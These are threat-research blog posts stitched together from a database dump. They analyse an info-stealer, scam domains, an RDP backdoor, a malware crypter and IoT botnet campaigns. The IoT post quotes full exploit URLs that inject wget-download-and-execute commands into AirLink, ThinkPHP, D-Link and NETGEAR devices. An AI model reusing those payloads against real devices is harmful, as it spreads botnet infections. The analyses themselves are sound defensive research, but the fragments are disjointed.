The Immortal stealer is sold on the dark web with different build-based subscriptions. This blog provides an analysis of the data Immortal steals from browsers, the files it steals (and the applications it steals from), and what it does with the stolen data.    Immortal starts its infection by creating a directory with a random name in a temp folder. Next, it creates a password.log file in \"\\%Temp%\\{Random_DirName}\\password.log”.        Immortal writes the malware name, author’s name, and telegram address of the author in a password.log file.      	Date: Current date and time  “MM/dd/yyyy HH:mm:ss”  	Windows Username: Username  	HWID: MachineGuid  	System: Operating system name      Browser info stealing    Immortal steals data from 24 browsers. It steals stored credentials, cookies, credit card data, and autofill data from the targeted browsers.    When the user saves a username and password in the targeted browser, it stores the data in a “Login Data” file in an SQLite database format, and the browser-stored cookie information in the “Cookies” file. It also stores autofill data, credit card data, and other web information in the “Web Data” file. Below are the file paths for those files:      	“\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Login Data”  	“\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Web Data”  	“\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Cookies”      List of targeted browsers:      	Chrome  	Yandex  	Orbitum  	Opera  	Amigo  	CentBrowser  	Torch  	Comodo  	Go!

Path: “\\%Temp%\\{Random_DirName}\\Cookies\\{Browsername_cookies.txt}\". The format is shown below.        Credit card data    Immortal fetches credit card data from the “Web Data” file and stores it in the {Browsername}_CC.txt file.    Path: “\\%AppData%\\{Random_DirName}\\CC\\{Browsername_CC.txt}”. The format is shown below.        Autofill data    The autofill feature of a browser allows the user to store commonly entered information in web forms. This information might include username, email, password, address, and credit card information. So, when the user opens a web page, it will automatically fill in the information already saved by the browser. The autofill information is stored in the “Web Data” file.    Immortal fetches autofill data from the “Web Data” file and stores it in the {Autofill}_CC.txt file.    Path: “\\%AppData%\\{Random_DirName}\\Autofill\\{Browsername_Autofill.txt}”. The format is shown below.             File stealing    Immortal steals files from many different applications. The details are below.    Minecraft launchers    The malware steals user data files and sessions from Minecraft launcher applications. The malware copies those applications\' files into “%Temp%\\{Random_DirName}\\Applications\\{AppName}\\”. The following is a list of the applications:      	MinecraftOnly  	McSkill  	LavaCraft  	MinecraftLauncher  	VimeWorld  	RedServer          Steam    The malware steals files for the Steam application. Steam is an application for playing, discussing, and creating games. The files stolen by Immortal are as follows:      	SSFN (2 files)  	VDF files from the config folder  	  		Config.vdf  		loginusers.vdf  	  	          Telegram and Discord    Immortal also steals session-related files from Telegram and Discord. Telegram is a cloud-based instant messaging and voice over IP service. Discord is the cross-platform voice and text chat application designed to help gamers talk to each other in real time. Immortal copies those files into “%Temp%\\{Random_Name}\\Applications\\{AppName}\\”.

In this blog, we will cover a few of such campaigns.\r\n\r\n \r\n\r\nInfrastructure Sharing\r\n\r\nIn our research last year, we noticed that domains with patterns such as some-domain[.]tk/index/?{random-long-int} were primarily showing support scams, such as alerting users that their systems had been infected with malware or claiming an infected site was from Microsoft and asking the user to use the hotline number provided. Once contacted, the scammer would take money from the end-user and perform random actions, show the filesystem tree, and claim the system was fixed.\r\n\r\nThis year, we are seeing slightly different behavior in which the same URI patterns are being leveraged for other scam redirections.\r\n\r\n\r\n\r\nFig. 1: Infection chain \r\n\r\nThe main site is injected with a malicious script responsible for malicious redirection chaining.\r\n\r\n\r\n\r\nFig. 2: Injected scripts\r\n\r\nThese injected scripts/URLs load different types of content in different iterations.\r\n\r\n\r\n\r\nFig. 3: Redirection chain\r\n\r\nAt the moment, these .tk domains are redirecting to various fake sites, including foreign exchange (forex), credit card, and healthcare, but the attacker can easily add more fake sites from other categories.\r\n\r\n\r\n\r\nFig. 4: Final .tk redirection to fake site\r\n\r\nThere are more than 700 .tk domains hosted on 185.251.39[.]220 and more than 80 .tk domains on 185.251.39[.]181, which are associated with this campaign. \r\n\r\n\r\n\r\n\r\n\r\nDomain squatting leads to tech support scam\r\n\r\nWe came across interesting instances in which a Google Mail squatted domain gmil[.]com was responsible for a Microsoft Tech Support scam redirection.\r\n\r\n\r\n\r\nFig. 5: Google Mail squatted domain leading to Microsoft Tech Support scam\r\n\r\nThe scam page that we received is similar to what we saw in our previous analysis, and there has been little to no development.\r\n\r\n\r\n\r\nFig. 6: Support scam page\r\n\r\nThe page microsft0x8024f0059rus[.]ml is hosted on 216.10.249[.]196, which is hosting over 400 .ga, .cf, .gq, .ml, and .tk domains; all are involved in Microsoft tech support scam activity.\r\n\r\n \r\n\r\nPopCash leading to fake sites, including medicine, tax debt relief, repair services, and adult sites \r\n\r\n\r\n\r\nFig. 7: PopCash redirecting to fake sites that use the same page template\r\n\r\nIn another redirection iteration, we saw adult-themed sites and a fake medicine site claiming to be CNN.\r\n\r\n\r\n\r\nFig. 8: Adult themed site and fake CNN page selling Viagra\r\n\r\n \r\n\r\nFake airlines\r\n\r\nWe also spotted fake airline sites using an identical template, contact number, and Google gtag.\r\n\r\n\r\n\r\nFig. 9: Similar fake airline sites\r\n\r\nThe use of the nearly identical template means there is a scam kit being used to automatically generate their page content.\r\n\r\n\r\n\r\nFig. 10: Template comparisons\r\n\r\nThe IP address 103.25.128[.]224 is hosting 70 or more of these fake airline sites.\r\n\r\nConclusion\r\n\r\nScam campaigns leveraging cheap domains such as .tk, .ga, .gq, .ml, .cf, and others have been on the rise for past few years now. Because registering such domains is very inexpensive, bad actors are doing bulk registrations for such domains and using them to generate revenue.\r\n\r\nWhile some of these sites are poorly designed and obvious scams, others are sophisticated and look very much like the real brand. Always look at a site’s URL to make sure the site is legitimate before initiating communications or making any kind of transaction.\r\n\r\nZscaler ThreatLabZ is actively monitoring scamming sites and other threats to ensure coverage and will continue to share information on these campaigns.\r\n\r\nIOCs\r\n\r\nAll scam domains involved in the above campaigns can be seen here.', '', 'http://www.zscaler.com/blogs/research/scammers-use-cheap-and-squatted-domains-create-fake-sites');

Millions of advanced threats.', 'Deepen Desai', 'February 27, 2019', 'Once seen as the ultimate protection for data being transmitted over the internet, encryption has become a vast playground for cybercriminals.    Zscaler ThreatLabZ, the research organization at Zscaler, analyzed the encrypted traffic traversing the Zscaler cloud in the second half of 2018 and prepared a report of our findings. The Zscaler cloud processes more than 60 billion transactions a day and, at that volume, it provides valuable insight into traffic patterns and the types of threats organizations are facing globally.    We already knew that the use of encryption had been rising each year and our research showed this trend continuing. By December 2018, the amount of encrypted traffic on the Zscaler cloud increased by 10 percent to nearly 80 percent of all traffic. This growth rate is consistent with that of the Google Transparency Report and Mozilla’s findings for the Firefox browser.    Zscaler has always made its cloud statistics available to anyone who wants to see them. We have recently created a dashboard that shows the volume of encrypted traffic crossing our cloud as a percentage of total traffic. You can view that interactive dashboard here.    Real-Time Zscaler Cloud Activity: Encrypted Traffic Dashboard    As the use of SSL* grows, cybercriminals are increasingly using encryption to conceal and launch attacks. In the second half of 2018, the Zscaler cloud blocked 1.7 billion threats hidden in SSL traffic, which translates to an average of 283 million advanced threats blocked per month. The top blocked threat categories in our study period included phishing attempts—which increased more than 400 percent over 2017—as well as malicious content, botnets, and browser exploits.    One of the reasons that SSL-based threats have increased so dramatically is because SSL/TLS certificates, which were once expensive and difficult to obtain, are now easy to get—at no charge. The vast majority of the certificates involved in security blocks in the Zscaler cloud were issued by Let’s Encrypt, a free service. Furthermore, nearly 32 percent of newly registered domains that were blocked by our cloud were using SSL encryption to deliver the content. We recommend inspecting and/or restricting access to newly registered domains, including those using SSL, to scan for malicious content being delivered from an otherwise unknown location with no history or reputation.    While the percentage of growth in SSL traffic is slowing as it reaches near totality, the threat trends are increasing in both frequency and sophistication. Cybercriminals know that most organizations are unable to inspect SSL traffic at scale. So, with malicious websites that can be set up in no time with free SSL certificates, they’re launching attacks that have a good chance of going undetected.    Organizations should be inspecting all encrypted traffic, even from CDNs and trusted sites, because many of the threats we continue to block are from legitimate sites that have been compromised. Organizations that don’t inspect all traffic are at risk of infiltration that can be difficult to remediate, lead to costly breaches, or damage their reputation.

This bot also installs “Plink,” which is legitimate remote sharing software that runs via command prompt using different switches from the C&C server. The bot appeared to have been written by Russian malware authors, which we were able to confirm after seeing some snippets in the resource section.    The screenshot below shows the malware tests on different operating systems.        During our analysis, we saw the following files being dropped by Murkios:    Win XP:    %AppData%\\ssh\\start.exe  %AppData%\\ssh\\systems.exe  %AppData%\\ssh\\winsys.exe  %AppData%\\ssh\\winsystem.exe  %AppData%\\ssh\\uid.txt  %AppData%\\ssh\\sel.txt    Win 7/Win 10:    %AppData%\\Roaming\\ssh\\start.exe  %AppData%\\Roaming\\ssh\\systems.exe  %AppData%\\Roaming\\ssh\\winsys.exe  %AppData%\\Roaming\\ssh\\winsystem.exe  %AppData%\\Roaming\\ssh\\uid.txt  %AppData%\\Roaming\\ssh\\sel.txt    Below is a summary of activities performed by dropped files:      	systems.exe – Installs RDP wrapper library  	winsystem.exe – Legitimate Plink PuTTY command line tool  	winsys.exe – Module acts as a mule sending all the harvested information to the attacker and has screen capture functionality  	start.exe – Has functionality to bypass UAC, checks OS version installed, executes other modules such as winsys.exe, adds net user accounts  	uid.txt – Stores unique identification (UID) of the victim\'s system      All the dropped files are present in the resource section of the parent file.        The malware tries to bypass the User Account Control (UAC) to execute <start.exe> which, in turn, establishes a connection with the C&C server and steals system information from the victim’s system.        The malware checks to see if the UAC value is enabled in the registry; if it is already set to “1” (which means UAC access control is enabled in the system), it will delete the mscfile and create a new mscfile and put the start.exe file path in it, which is placed in the application directory.    Next, it checks whether the system is 32 bit or 64 bit:        The start.exe further creates schtask.exe to execute winsys.exe, which installs the legitimate remote sharing tool onto the victim’s system.        Parameters:    /sc: Specifies Schedule Type    ONLOGON: The task runs whenever a user (any user) logs on    /tn:         Specifying the name of the task    /tr:         Specifies the program or command that the task runs ’winsys.exe’ in our case    The malware uses the net user command to add a user account and sets a password from the command prompt in hidden mode.             Enabling remote desktop from the command prompt:        Parameters:    /MAXPWAGE: UNLIMITED: Never expire the password.    localport=3389: The server listens on TCP port 3389, which is the port Microsoft uses for Windows Remote Desktop, and makes remote assistance connections which are also used by Windows terminal users. It tries to change the Remote Desktop Protocol-Transmission Control Protocol (RDP-TCP) connections permissions in the Windows registry through the Microsoft Windows terminal service.          The malware can take control of a remote computer or virtual machine over a network. This malware is using the following commands while in RDP.         	  		  			Functions  			Description  		  		  			AllowTSConnections  			   			  			  				  					  						  						Ready to make the connection for remote desktop from terminal service  						  					  				  			  			  			  		  		  			fDenyTSConnections  			Allows or denies connection to Terminal Services; possible values are 0 or 1. 0  		  		  			MaxConnectionTime  			Maximum session time in seconds  		  		  			MaxDisconnectionTime  			   			  			  				  					  						  						Maximum time in seconds after which disconnected sessions are ended  						  					  				  			  			  			  		  		  			MaxIdleTime  			   			  			  				  					  						  						Maximum idle time in seconds for user sessions  						  					  				  			  			  			  		  	           Further, the system.exe process is hidden using the switch mode through cmd.exe and installs RDP Wrapper files into the C:\\Program Files\\RDP Wrapper directory, which enables Remote Desktop Host support and concurrent RDP sessions on home systems with reduced functionality. The RDP Wrapper works as a layer between the Service Control Manager and Terminal Services, so the original termsrv.dll file remains untouched.            Sends data to C&C:        After sending data to the server, the malware executes winsys.exe, which then executes winsystem.exe to download Plink PuTTY software. The winsys.exe executable also runs in hidden mode through the command prompt.    Winsys.exe    This module acts as a mule and sends all the information to the attacker. This module has three functions. The first function captures the screen from the compromised system and sends it to the attacker.

The Zscaler ThreatLabZ research team recently spotted a common crypter being used in the recent Emotet, Qbot, and Dridex campaigns. This same crypter was observed in some of the Ursnif and BitPaymer campaigns as well. One of the reasons that Emotet and Dridex were able to survive for so long can be attributed to their ability to evade detection through the use of a volatile and polymorphic crypter, which wraps its original binary inside to complicate its detection and analysis.    Emotet is modular malware that primarily functions as a downloader or dropper for other banking Trojans. Emotet has been active for the past four years and it was one of the most prevalent malware families of 2018. In previous blogs, we analyzed Emotet and one of its delivery campaigns. Dridex is a banking Trojan that evolved from the Zeus Trojan family. Dridex remains active in the wild even after the FBI’s takedown attempt in 2015. Qbot can allow remote access to a victim’s system, steal information, and upload this stolen information to the attacker’s remote server. Recently, Emotet’s payload URLs were found to be serving Qbot and were using the same crypter we’re examining in this report.    This crypter provides multiple layers of protection on its core malware binary. In this research, we will describe the properties of crypted binaries that hold true across various mutations. These properties can be validated statically (without executing the binary) and used to write a decrypter. Below is a pictorial view of how Emotet’s core binary is digested inside the crypter’s layers of obfuscation and encryption wrappers.    0. Core binary    1. Code is obfuscated by shuffling instructions and substituting jump instruction    2. Obfuscated binary is encrypted and appended at the end of the custom loader binary    3. File alignment of custom loader binary is jumbled    4. Custom loader binary is encrypted    5. Final binary encapsulating scattered chunks of encrypted custom loader binary             Image 1: Stages occur in crypter    Our goal is to reverse each of above stages to get the core malware binary. Furthermore, the core binary is supposed to be independently loadable/executable, and IOCs should be easily extractable. So, starting with stage 5, we will describe certain heuristics properties of the binary and using these properties we will decrypt the stage and continue to track down till stage 0. In our analysis, we found that these heuristics properties hold true across all mutations of the binaries.         Stage 5:    The 5th stage binary is the Emotet executable file that is downloaded via malicious links in MalSpams or malicious macros in MS Office documents. Our goal in stage 5 is to reach stage 4 to obtain the encrypted custom loader binary. As we can see in image 1, the binary at this stage contains scattered chunks of encrypted custom loader binary. We need to spot these chunks and assemble them in the proper order. Before discussing how we are going to do this, what follows are few examples of how these chunks can be spread across the binary. The chunks are outlined in red.            Image 2. Examples of chunk patterns    From the above examples, we can see that these chunks are not found in fixed locations, as their sizes are inconsistent, and the order of chunks varies, too. Therefore, our first challenge is to locate these chunks and arrange them in the proper order. The good news is that we know the crypter will also need to arrange the chunks and will do so by storing the chunk addresses and sizes in a table. Let’s call this table “Chunk Descriptor Table.” The bad news is that this table cannot be found in a predictable location in the binary nor is the structure of the table is constant across mutations of the binary. Below are some of the variants of this table structure. Chunk Descriptor Table is basically an array of the Chunk Descriptor Entry.    struct ChunkDescriptorEntry[n] ChunkDescriptorTable; // n == number of chunks        Image 3: Examples of Chunk Descriptor Table structures         In above structure, “chunkAddressDword” contains the virtual address of chunk. The size of chunk can be obtained by one of following operations on “firstDword” and “secondDword”. This operation is constant across all chunk descriptor entries.      	unsigned int chunkSize = firstDword + secondDword  	unsigned int chunkSize = firstDword ^ secondDword  	unsigned int chunkSize = secondDword - firstDword      Heuristics properties of Chunk Descriptor Table:      	0 <= x <= ?,      0 <= y <= ?,      0 <= z <= ?  	offset(firstDword) < offset(secondDword) < offset(chunkAddressDword)  	offset(firstDword) < offset(chunkAddressDword) < offset(secondDword)  	offset(chunkAddressDword) < offset(firstDword) < offset(secondDword)  	entropy(chunk) > 5 out of 8.  	Chunks do not contain consecutive 4 zeros.      The following is the pseudo code for finding the chunk pattern. The function “FindChunkEntry” return offset of chunk and the distance of firstDword, chunkAddressDword from the beginning of the chunk offset. If the return value of three consecutive calls to function and length between three returned offsets are equal, then the whole array can be parsed to generate an associative array of chunk addresses and chunk sizes.    (offset1, m1, n1) = FindChunkEntry(filedata, fileSize)  (offset2, m2, n2) = FindChunkEntry(filedata + offset1, fileSize)  (offset3, m3, n3) = FindChunkEntry(filedata + offset2, fileSize)  If (offset2 - offset1) == (offset3 – offset2)      // found the FindChunkEntry array    FindChunkEntry(filedata, fileSize)          p = 0          while p > fileSize                  firstDword = filedata[p]                  q = p                  while q < p + T                  secondDword = filedata[p]                          chunkSize = firstDword (+) secondDword                          r = p - T                          while r < q + T                                  chunkAddress = filedata[r]                                  if ValidateChunk(chunkAddress, chunkSize) == TRUE // Heuristics 5, 6                                          if p < q < r                                                  x = q - p                                                  y = r - q                                                  z = ?                                                  return (p, x, y)                                          elif p < r < q                                                  x = r - p                                                  y = q - r                                                  z = ?                                                  return (p, x, y)                                          elif r < p < q                                                  x = p - r                                                  y = q - p                                                  z = ?                                                  return (r, x, y)                                  r += 4                          q += 4                  p += 4    Now that we have an associative array of chunk address and chunk sizes, we can combine these chunks to get the encrypted custom loader binary. Here we are at stage 4.         Stage 4: ​    In our analysis, we observed that the custom loader binary (PE exe) is encrypted with a simple byte-to-byte addition in the loop with a key array. It is not necessary for the binary to be present at zero offset in this encrypted data. In stage four, our objective is to find the offset of the PE file in the encrypted data and the decryption key. First, we will find the decryption key, which can be brute forced over encrypted data to find the starting offset of the PE file. Decryption is present in the 5th stage binary but not at a predictable location. We will derive the decryption key from the encrypted data itself.    The heuristics property to be noted about the encrypted data is a pattern of a repeating consecutive sequence of bytes. This pattern of the repeating sequence is induced by nature of the encryption and the properties of the PE file. In the encrypted data, this pattern will appear at locations that should have filled with zeros when non-encrypted. The following are possible locations.      	At beginning of the encrypted data because the PE file will not necessarily begin at zero offset.  	Caves between two sections and between the PE header and the first section.          Image 4: Encrypted data showing an example of the repeating sequence of bytes             Image 5: Decrypted data showing the appearance of the corresponding PE file         The repeating sequence is our key and the length of the sequence is the key length. The next thing we need to do is to find the beginning of the key in this consecutively repeating sequence and offset of the PE file. This can be done by simply applying the inverse of the encryption on this sequence and the encrypted data from its starting point while checking against the MZ header.    Here is the pseudo code:    FindPeFileAndKeyStart (keySequence, keySequenceLen, encryptedData, encryptedDataLen)          k = 0          while (k < keySequenceLen)                  i = 0                  while (i < encryptedDataLen)                          if (    // inverse encryption                              encryptedData[i + 0] - keySequence[k + 0] == 0x4D &&                              encryptedData[i + 1] - keySequence[k + 2] == 0x5A &&                              encryptedData[i + 3] = keySequence[k + 3]                              )                                  peFileOffset = i                                  keyStart = k                                  return (peFileOffset, keyStart)       Now that we have the PE file offset and key, we can decrypt the data with byte-to-byte subtraction with the key in the loop. At this point, we have the custom loader binary, but this custom loader binary has a strange file alignment that we need to normalize. Thus, we are at stage 3.    But before proceeding with stage 3, here are few more methods that could also have given us the key in this stage.      	Search for instruction in the binary of the 5th stage, which accesses the key. Here are the examples that we found in our analysis.    	  		8A 0C 1D FF 31 40 00                          MOV CL, BYTE PTR DS : [EBX + 4031FF]  		2A 0C 1D 30 42 40 00                         SUB CL, BYTE PTR DS:[EBX+404230]  		8D 84 01 0B 32 36 01                          LEA EAX,DWORD PTR DS:[ECX+EAX+136320B]  		8B 1D E4 DD 46 00                              MOV EBX,DWORD PTR DS : [46DDE4]  		8D 0D 81 A1 3D 01                              LEA ECX,DWORD PTR DS:[13DA181]  		8A 86 77 41 E8 00                                MOV AL, BYTE PTR DS : [ESI + E84177]  		8A 98 77 51 C0 00                               MOV BL, BYTE PTR DS : [EAX + C05177]  		A1 3C FB 46 00                                     MOV EAX,DWORD PTR DS : [46FB3C]  	  	      DWORD points to a key array; of course it will give a false address. So, we need to validate the key by applying it on encrypted data for each such instruction.    2. In most cases, the key is found just above the pdb path.         Stage 3:    At this stage, we have a custom loader binary whose file alignment is messed up. We are going to assign a new file alignment to this PE image which is 0x200. Changing the file alignment is trivial, only requiring us to carefully shift sections of the new file alignment based calculated addresses and updating section addresses and sizes in the Section Header table.    Here is the pseudo code.    dwNewFileAllignment = 0x200  dwCurrentRawAddress = GetAllignedDwrod(PEHeader.OptionalHeader.SizeOfHeaders, dwNewFileAllignment);          while (i < NumberOfSections)                  NewSecionHeaders[i].PointerToRawData = dwCurrentRawAddress;                  NewSecionHeaders[i].SizeOfRawData = GetAllignedDwrod(OldSecionHeaders[i].SizeOfRawData, dwNewFileAllignment);                  Memcpy(pbyNewFileBuffer + dwCurrentRawAddress,                                  pbyOldFileData + OldSecionHeaders[i].PointerToRawData,                                  OldSecionHeaders[i].SizeOfRawData);                  dwCurrentRawAddress += GetAllignedDwrod(OldSecionHeaders[i].SizeOfRawData, dwNewFileAllignment);                  dwCurrentRawAddress = GetAllignedDwrod(dwCurrentRawAddress, dwNewFileAllignment);                  i = i + 1    This is it, we have plain and loadable binary of custom loader. That moved us to stage 2.       Stage 2:     In the appended data of the custom loader, there is encrypted data which is nothing but an obfuscated version of the core malware binary. The encryption method is the same as that of stage 4. All we need to do here is calculate the offset of the appended data and apply the decryption technique mentioned in the 4th stage. As a result, we got the core PE file, but it needed some fixes in the code as some instructions were missing in the binary.         Stage 1:    At this stage, we have a PE file which is somewhat incomplete because the loader binary had already eaten up some instructions from the code section. These eaten instructions will be put in memory and a JUMP instruction will be inserted in the code of the core binary, which points to the corresponding eaten instructions. Then the control is passed over to the core binary.    The below image is an example of how this obfuscation appears.             Image 6: Obfuscated code with JUMP instruction         The final objective is to de-obfuscate the code of the core binary. That means we need to return the eaten instructions back to their actual location and remove the JUMPs. At this point, the above code will appear as follows.             Image 7: De-obfuscated code    It is the loader’s responsibility to smoothly execute the core malware even after instructions are placed in different locations. The loader needs to calculate the JUMP address of the moved instructions and put the JUMP instructions in place of those instructions. For this, the moved instructions and their meta information are stored in the loader’s binary itself. In our analysis, we found that the table containing this information was present in the “.rdata” section.    struct DeobfuscationTable  {          unsigned int dwOrgInstrVAdddress; // Address of eaten instruction in loader’s binary          unsigned int dwPatchRVAddress;    // Offset where Jump need to insert          unsigned int dwOrgInstrLength;    // length of moved instructions in bytes  };         Once we get the de-obfuscation table, we just need to read “dwOrgInstrLength” bytes from the virtual address “dwOrgInstrVAdddress” loader’s binary and write them to a relative virtual address “dwPatchRVAddress” in the core malware binary.    Here is the pseudo code for this.    while (pDeObfuscationTable-> dwOrgInstrVAdddress !=  0x00)  {          patchOffset = GetFileOffsetFromRVA(          pCorePEHeader,          pCoreSectionHeaders,          pDeObfuscationTable-> dwPatchRVAddress);          orgInsOffset = GetFileOffsetFromRVA(          pLoaderPEHeader,          pLoaderSectionHeaders,          pDeObfuscationTable-> dwOrgInstrVAdddress - pLoaderPEHeader-OptionalHeader.ImageBase);          memcpy (                  pbyCoreFileData + dwPatchOffset,                  pbyLoaderFileData + orgInstrOffset,                  pDeObfuscationTable->dwOrgInstrLength);          pDeObfuscationTable += 1;  }       At this stage, we would have obtained the plain, independently executable core Emotet binary, which can be decompiled by IDA or can be bin-diffed with other binaries extracted by this decoder.', 'Malware', 'https://www.zscaler.com/blogs/research/demystifying-crypter-used-emotet-qbot-and-dridex');

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (7, 'A sneak peek into recent IoT attacks', 'Pradeep Kulkarni,', 'January 28, 2019', 'Since the Mirai botnet source code was leaked in 2016, it was inevitable that we’d see its variants being put to use in IoT threat campaigns. Apart from using brute-force techniques to attack IoT devices through various protocols, the botnet also seems to be leveraging vulnerabilities present in IoT devices to infect other IoT devices. These vulnerabilities are mostly in management frameworks and, by exploiting them, attackers are achieving remote code execution. This typically results in turning the infected device into a bot which in turn forms a bigger botnet army. In some cases, we also saw cryptominers as the final payload delivered in the IoT campaigns.    The Zscaler ThreatLabZ team has been actively tracking these IoT attacks and analyzing their behavior, exploits, and payloads. In this blog, we will summarize our observations about a few of the more prominent IoT attacks we observed.    The graph below shows the IoT attacks we detected over the last three months.        Fig. 1: Detection timeline of prominent IoT threats    We observed a significant spike in detection at the start of January 2019. The spike was due to the heavy adoption of the ThinkPHP exploit, which we’ll describe later in the report.    RIFT botnet     The RIFT botnet emerged in December 2018 and uses a variety of exploits to infect IoT devices. According to online sources, the botnet used 17 exploits. The table below includes some of the more prominent RIFT exploits and those that continue to be active.        Fig. 2: Observed active exploits used in RIFT attack    Most of the vulnerabilities exploited were Remote Code Execution (RCE) or Command Injection types. It was surprising to see the use of WordPress-based websites into IoT devices. This indicates the use of readily available frameworks in IoT devices is increasing due to ease of integration.    The following are typical post-exploitation steps:      	Download the payload using “wget” command  	  		The payload downloaded was Shell script or ELF file  		In case of Shell script as payload, it downloads the ELF file depending on the code present inside it  	  	  	Store the payload into “/tmp” directory  	Make the payload executable using “chmod” command  	  		chmod 777 <filename>  	  	  	Run the payload  	  		/tmp/<filename>  	  	      Let’s take a sneak peek into one of the exploits we observed in the RIFT attack.    CVE-2015-2280 – AirLink101 SkyIPCam1620W Wireless N MPEG4 3GPP network camera OS command execution vulnerability     There is an OS command injection vulnerability in “snwrite.cgi”. The OS command can be injected through the parameter “mac”. The exploit URL looks like the following:    <IP-ADDRESS>/maker/snwrite.cgi?mac=1234;wget%20http://89.46.223.70/airlink[.]sh%20-O%20/tmp/666trapgod;chmod%20777%20/tmp/666trapgod;./tmp/666trapgod    Post successful exploitation of this vulnerability, the “wget” command downloads the shell script payload from the URL “hxxp://89[.]46[.]223[.]70/airlink.sh” and stores the payload using “-O” switch to “/tmp/666trapgod”. Later, it changes the permission of the shell script file to 777 (full permissions), which makes it executable and then runs it from its location in the “/tmp” directory.        Fig. 3: Malicious “airlink.sh” shell script    The “airlink.sh” (which is stored as “66trapgod”) downloads the final payload from the dropper server “89[.]46[.]223[.]70”. It downloads the payload for all the *INX and other firmware architectures and hopes one of its suits to victim’s architecture and executes it. All the payloads are prefixed with the “rift” string. The targeted architectures are:    x86, arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, ppc-440fp, sh4, spc, x32, x64                 Fig. 4: RIFT botnet (rift.x86) packed with UPX packer    The static analysis of the unpacked payload reveals its contents.      	It contains a list of known default usernames and passwords of IoT devices.          Fig. 5: Usernames and passwords found in RIFT botnet         	Various IoT exploits, a few of which are mentioned in the below screenshot. (Also contains some mentioned in Fig. 2.)          Fig. 6: Exploits in the RIFT botnet    Using these default credentials and exploits, the infected IoT device infects another device. There is also an interesting reference in the payload that refers to “OrkSec Gang.”        Fig. 7: OrkSec Gang reference    The following are the user-agents seen in this attack:      	Dark  	Rift/2.0  	Sefa  	Shaolin/1.0  	Oof      ThinkPHP exploitation    On December 11, 2018, a remote code execution vulnerability in the ThinkPHP framework was reported. The ThinkPHP is used predominantly in China. We believe ThinkPHP is also being incorporated in upcoming IoT devices for its management plugins. The exploit code is as follows:    <IP-ADDRESS>/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20hxxp://orksecpatrol[.]xyz/bins/rift.x86;cat%20rift.x86%20>%20gfrihk;chmod%20777%20gfrihk;./gfrihk%20thinkphp;rm%20gfrihk    The OS commands are injected through the query parameter “vars”. This follows a typical exploitation sequence observed in RIFT attacks (as explained above). The payload was downloaded from the URL “hxxp://orksecpatrol[.]xyz/bins/rift.x86”, which is similar to what we saw in the case of RIFT. The payload downloaded from the ThinkPHP exploit also was packed with UPX and contains a list of well-known usernames and passwords. Similar exploits were also embedded in the binary that we saw in the RIFT botnet. The notable difference was that this payload now contains the ThinkPHP exploit. It appears that the RIFT attack incorporated this exploit into its arsenal.               Fig. 8: Inclusion of ThinkPHP exploit in RIFT botnet    There was one more difference: a couple of vulnerabilities exploited over the UPnP SOAP (CVE-2014-8361) protocol in Realtek SDK Miniigd was using the user-agent string “NotRift/2.0” instead of the previously used user-agent “Rift/2.0” string.        Fig. 9: Comparing UPnP exploits observed in RIFT and ThinkPHP payloads    It has become evident that the RIFT botnet is also being delivered through the ThinkPHP exploitation.    D-Link router exploitation     In addition to other targets, we saw major hits related to DLink routers, especially the DSL-2750B model. This model had a Remote Code Execution (RCE) vulnerability that can be exploited with the “cli” parameter (“login.cgi?cli=”). The parameter directly invokes the “ayecli” binary, and arguments to this parameter become the input to binary. Below is the observed exploit code:    <IP Address>/login.cgi?cli=aa aa\';wget hxxp://89[.]46[.]223[.]70/dlink.sh -O -> /tmp/ff;chmod +x /tmp/ff;sh /tmp/ff\'$    The URL downloads a shell script from “hxxp://89[.]46[.]223[.]70” and drops it into “/tmp/” directory with file name “ff”. We noticed that file names were totally random. Later, the file is made executable with the “chmod +x” command and is finally executed.    The shell script contains download links of additional payloads for different architectures.                 Fig. 10: Malicious “dlink.sh” shell script    The task of shell script is to remove all contents from the “/tmp/” directory, download the actual payload, make the payload executable, and finally execute the payload. It tries to download and execute payloads for many *NIX architectures including but not limited to .arm, .arm5, .arm7, .mips, .mpsl, .x86, etc. Once the payload is executed, it deletes all the payloads from the “/tmp/” directory, leaving no trace of the attack.    The payload dropped from the exploit was not packed, and a simple static analysis of the file showed reference to another famous UPnP SOAP exploit (CVE-2014-8361) in Realtek SDK Miniigd. This vulnerability affects all the IoT devices embedded with Realtek SDK. This Mirai variant tries to exploit all the other devices with the embedded exploit of Realtek SDK Miniigd.        Fig. 11: Realtek SDK Miniigd exploit – CVE-2014-8361    Shaolin botnet (exploitation of NETGEAR vulnerability)    In the first week of January 2019, we saw hits targeting NETGEAR routers. In these attacks, an old bug was being used for Remote Code Execution (RCE). NETGEAR DGN2200 and NETGEAR DGN1000 are vulnerable to this bug.    We saw similar patterns in the URL below, where attackers were trying to download additional payloads from external locations. The exploit code is as follows:    <IP Address>/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;wget hxxp://145[.]239[.]138[.]69/bins/shaolin.mips -O /tmp/netgear;sh netgear&curpath=/&currentsetting.htm=1    The downloaded payload “shaolin.mips” is named “netgear” and is executed directly after download. This payload is similar to what we saw in the Airlink101 SkyIPCam case described earlier and used multiple exploits. We found it to be using the SOAP exploit, which targets DSL modems as shown in the code snippet below:        Fig. 12: SOAP exploit targeting DSL modems    The payload also tries to exploit the Home Network Administration Protocol (HNAP) in D-Link routers to download additional payloads. The following snippet was fetched from a payload that shows usage of HNAP.        Fig. 13: HNAP exploit targeting D-Link routers    In addition, we found many embedded usernames and password, similar to what we saw in the AirLink case.    Conclusion    The IoT space is evolving, and so is the attack surface of these devices. IoT devices need to be patched on a timely basis, which presents a challenge. IoT devices also need to be updated regularly. Even though techniques like brute-force attacks that use default passwords are not new, they remain effective because device passwords tend to go unchanged following installation. By hardening IoT devices and baking security in, many of the attacks we’ve been seeing can be countered.

